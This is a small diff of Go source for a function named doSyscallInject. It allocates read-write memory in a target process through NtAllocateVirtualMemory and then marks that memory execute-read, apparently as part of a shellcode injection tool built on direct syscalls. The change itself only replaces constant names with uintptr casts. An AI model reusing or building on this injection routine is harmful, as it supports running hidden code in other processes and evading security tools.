@@ -77,8 +77,8 @@ func doSyscallInject(hProc uintptr, sc []byte) error {
 		uintptr(unsafe.Pointer(&allocAddr)),
 		0,
 		uintptr(unsafe.Pointer(&regionSize)),
-		MEM_COMMIT|MEM_RESERVE,
-		PAGE_READWRITE,
+		uintptr(memCommit|memReserve),
+		uintptr(pageReadwrite),
 	)
 	if r1 != 0 {
 		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", r1)
@@ -103,7 +103,7 @@ func doSyscallInject(hProc uintptr, sc []byte) error {
 		hProc,
 		uintptr(unsafe.Pointer(&allocAddr)),
 		uintptr(unsafe.Pointer(&regionSize)),
-		PAGE_EXECUTE_READ,
+		uintptr(pageExecuteRead),
 		uintptr(unsafe.Pointer(&oldProt)),
 		0,
 	)
